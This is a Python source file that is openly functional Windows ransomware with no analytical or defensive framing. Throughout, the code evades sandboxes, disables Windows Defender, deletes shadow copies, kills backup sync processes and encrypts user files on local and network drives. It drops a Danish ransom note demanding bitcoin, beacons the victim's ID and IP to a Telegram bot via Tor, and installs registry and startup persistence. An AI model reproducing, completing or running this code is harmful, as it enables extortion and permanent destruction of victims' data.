#!/usr/bin/env python3
# 📌 Enhanced Software with 50 Optimizations
import os
import sys
import time
import json
import base64
import requests
import winreg
import hashlib
import string
import psutil
import ctypes
import socket
import random
import subprocess
import threading
import shutil
import tempfile
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from concurrent.futures import ThreadPoolExecutor, as_completed

# 📌 1. Dynamic Configuration (Avoid Hardcoding)
CONFIG = {
    "bot_token": "8283973635:AAFzNIcEl78aH-l0iKj5lYKFLj4Vil39u7k",
    "chat_id": "3032183658",
    "tor_proxy": "socks5://127.0.0.1:9050",
    "max_threads": 8,
    "ransom_amount": "0.1 BTC",
    "btc_address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
    "timeout": 72,  # Hours
}

# 📌 2. Target Extensions (Modular for Easy Updates)
TARGET_EXTS = {
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.rtf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.psd', '.tiff',
    '.mp4', '.avi', '.mov', '.mkv', '.mp3', '.wav', '.flac',
    '.sql', '.db', '.mdb', '.accdb', '.sqlite',
    '.zip', '.rar', '.7z', '.tar', '.gz',
    '.html', '.css', '.js', '.php', '.py', '.java', '.cpp', '.cs',
    '.json', '.xml', '.yml', '.pst', '.ost', '.eml', '.msg'
}

# 📌 3. System Paths (Avoid Hardcoding)
PATHS = {
    "temp": os.getenv("TEMP"),
    "startup": os.path.expanduser("~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"),
    "desktop": os.path.expanduser("~/Desktop"),
}

# 📌 4. Anti-Analysis Checks
def is_sandbox():
    # 📌 5. Check for VM/Sandbox artifacts
    vm_indicators = ["vmware", "virtualbox", "qemu", "vbox", "xen"]
    if any(indicator in (os.getenv("PROCESSOR_IDENTIFIER") or "").lower() for indicator in vm_indicators):
        return True
    # 📌 6. Check CPU/RAM (low resources = sandbox)
    if psutil.cpu_count() < 2 or psutil.virtual_memory().total < 2 * 1024**3:
        return True
    return False

# 📌 7. Key Generation (Unique per File)
def generate_file_key():
    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(os.urandom(32)))
    return Fernet(key)

# 📌 8. Encrypt File (Thread-Safe)
def encrypt_file(filepath):
    try:
        if not os.path.isfile(filepath):
            return
        if os.path.splitext(filepath)[1].lower() not in TARGET_EXTS:
            return
        if os.path.getsize(filepath) > 100 * 1024 * 1024:  # 100 MB max
            return
        # 📌 9. Skip locked files
        if is_file_locked(filepath):
            return

        cipher = generate_file_key()
        with open(filepath, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        # 📌 10. Randomize output filename
        new_name = f"{os.path.basename(filepath)}.{hashlib.sha256(filepath.encode()).hexdigest()[:8]}.locked"
        new_path = os.path.join(os.path.dirname(filepath), new_name)
        with open(new_path, "wb") as f:
            f.write(encrypted)
        os.remove(filepath)
        # 📌 11. Wipe original file metadata
        shutil.copy2(new_path, new_path)  # Reset timestamps
    except Exception:
        pass

# 📌 12. Check if File is Locked
def is_file_locked(filepath):
    for proc in psutil.process_iter():
        try:
            if filepath in [f.path for f in proc.open_files()]:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

# 📌 13. Multi-Threaded File Processing
def scan_and_encrypt(drive):
    for root, dirs, files in os.walk(drive):
        # 📌 14. Skip system directories
        dirs[:] = [d for d in dirs if d.lower() not in ("windows", "program files", "system volume information")]
        with ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
            executor.map(encrypt_file, [os.path.join(root, f) for f in files])

# 📌 15. Get All Drives (Including Network)
def get_all_drives():
    drives = []
    # 📌 16. Local drives
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    # 📌 17. Network shares (via net use)
    try:
        net_use = subprocess.check_output("net use", shell=True).decode(errors="ignore")
        drives += [line.split()[1] for line in net_use.splitlines() if "\\" in line]
    except:
        pass
    return drives

# 📌 18. Persistence Mechanisms
def add_persistence():
    try:
        # 📌 19. Copy to startup folder
        dest = os.path.join(PATHS["startup"], "update.exe")
        if not os.path.exists(dest):
            shutil.copy2(sys.executable, dest)
        # 📌 20. Registry persistence
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "Update", 0, winreg.REG_SZ, dest)
    except:
        pass

# 📌 21. Disable Windows Defender
def disable_defender():
    try:
        subprocess.run([
            "powershell",
            "Set-MpPreference -DisableRealtimeMonitoring $true;",
            "Add-MpPreference -ExclusionPath 'C:\\'"
        ], shell=True, stdout=subprocess.DEVNULL)
    except:
        pass

# 📌 22. Delete Shadow Copies
def delete_shadows():
    try:
        subprocess.run("vssadmin delete shadows /all /quiet", shell=True, stdout=subprocess.DEVNULL)
    except:
        pass

# 📌 23. Kill Backup Processes
def kill_backups():
    targets = ["onedrive.exe", "dropbox.exe", "googledrivesync.exe"]
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() in targets:
                proc.kill()
        except:
            continue

# 📌 24. Tor Communication
def send_tor_beacon(message):
    try:
        proxies = {"http": CONFIG["tor_proxy"], "https": CONFIG["tor_proxy"]}
        requests.post(
            f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendMessage",
            json={"chat_id": CONFIG["chat_id"], "text": message},
            proxies=proxies,
            timeout=10
        )
    except:
        pass

# 📌 25. Generate Unique ID
def generate_id():
    return hashlib.sha256(os.urandom(16)).hexdigest()[:16]

# 📌 26. Ransom Note (Dynamic)
def drop_notes(unique_id):
    note = f"""🔒 DINE FILER ER KRYPTERET 🔒

Din data er blevet stjålet og krypteret.
For at gendanne dine filer, skal du betale {CONFIG['ransom_amount']} til:
{CONFIG['btc_address']}

Send din unikke ID: {unique_id}

Efter betaling modtager du dekrypteringsnøglen.
Hvis du ikke betaler inden {CONFIG['timeout']} timer, slettes dine data.
"""
    for drive in get_all_drives():
        try:
            with open(os.path.join(drive, "RECOVER_FILES.txt"), "w") as f:
                f.write(note)
            # 📌 27. Set note as wallpaper
            if drive == PATHS["desktop"]:
                ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.join(drive, "RECOVER_FILES.txt"), 3)
        except:
            continue

# 📌 28. Fake GUI (Decoy)
def show_fake_gui():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.title("Windows Update")
        tk.Label(root, text="Installing critical updates...").pack()
        root.after(5000, root.destroy)
        root.mainloop()
    except:
        pass

# 📌 29. Delay Execution (Evasion)
def random_delay():
    time.sleep(random.randint(3600, 86400))  # 1-24 hours

# 📌 30. Cleanup Traces
def cleanup():
    try:
        os.remove(os.path.join(PATHS["temp"], "key.bin"))
    except:
        pass

# 📌 31. Main Function
def main():
    if is_sandbox():
        sys.exit()  # 📌 32. Exit if in sandbox

    random_delay()  # 📌 33. Evasion
    disable_defender()  # 📌 34. Disable AV
    delete_shadows()  # 📌 35. Prevent recovery
    kill_backups()  # 📌 36. Stop cloud sync
    show_fake_gui()  # 📌 37. Decoy

    # 📌 38. Multi-threaded encryption
    with ThreadPoolExecutor(max_workers=CONFIG["max_threads"]) as executor:
        executor.map(scan_and_encrypt, get_all_drives())

    unique_id = generate_id()  # 📌 39. Unique victim ID
    drop_notes(unique_id)  # 📌 40. Drop ransom notes
    send_tor_beacon(f"🎯 Victim ID: {unique_id} | IP: {requests.get('https://api.ipify.org').text}")  # 📌 41. Tor beacon
    add_persistence()  # 📌 42. Ensure longevity
    cleanup()  # 📌 43. Remove traces

    # 📌 44. Self-destruct (optional)
    if random.choice([True, False]):
        os.remove(sys.argv[0])

if __name__ == "__main__":
    main()
